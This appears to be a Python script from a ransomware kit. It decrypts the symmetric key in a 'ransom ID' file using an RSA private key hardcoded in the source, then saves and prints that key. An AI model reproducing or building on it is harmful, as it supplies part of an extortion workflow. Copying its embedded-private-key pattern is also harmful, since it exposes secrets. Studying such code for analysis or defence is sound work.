from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64decode
import os


#hardcoded private key
keypriv= 'MIICXAIBAAKBgQC5d/kUBCvkxf9CTULnGt8rXDblP84G6jRGGklwd47GlWUdaHJlz1cN/+t9b+MZE/63IeNU7HX3OXK06v9AY1l22qe0ug1Ij8beN3C1yIjgU5AtIThZ5q4sQTAp4cqsb83QuqJLrHvFUQBOfrYySNkHHQEdcX+bdMj5hs+fUp5f8wIDAQABAoGALyljzAQ3iSgT/a8Z2RyLLUJ4rxjncfiyLDVZAWFVjAfHO5AortznfSbbof0GmYTtG3JhlWG/qYsRMRIksCHTSKfxe/hagVnizYDcB0bahEZWhaBl0rmbgF8C9IoriFnhkO2T8J2LMlZb1Nic6Dyz/0xinyR22X90OJgwaAU+pWkCQQDRzB7c6cG4em4OmPOlRrt+ypwW7PS5mce1PwP6F8eWXVN0G89RmEoY3qzkHpTYAL1eiOd1PYTNqujuquZpbRPfAkEA4lBB8jz8PkO8za3lZO6fCM3sfRmHoBp1/U4bjKpMgK6FrRDMTe0lQ0/dyJamR5h1+rf/zc4UKNmVFM1jhYBWbQJAB+DPY+JPSPsn+Npbg+BVGBzJob7CLdoNesvj/Vc5Qnc8tAZ7UYgTeD2cZnCTjEzyz4L6lhd6TjLVzmiSgHD9JwJALE0jq6SuiA3Afs7Ese5YKWQOICsINpoXcL+CexW3JhWDy24XYEXE3plaw/JhmHBK4Ap2w7XMknaNTWYrTi3iPQJBAKxOXkKvDUZQz1v1yZ+OpHe3qjSEmAo9pPpkRyGBMVjRy8at9ZGVKwndI51FWlEmpdPHdJI3fUXryUC1ohNtfQc='
keyDER = b64decode(keypriv)
privkey = RSA.importKey(keyDER)


#decrypt the symmetric key with the private key


def decrypt_key(filename, privkey):
    with open(filename, "rb") as f:
        plaintext = f.read()
       
    cipher = PKCS1_OAEP.new(privkey)
    key = cipher.decrypt(plaintext)
    with open(filename + ".key", "wb") as f:
        f.write(key)    
    return key


if (__name__ == '__main__'):
    filename = input("Input ransom ID file name:  ") #example.txt.ID
    print(decrypt_key(filename, privkey))
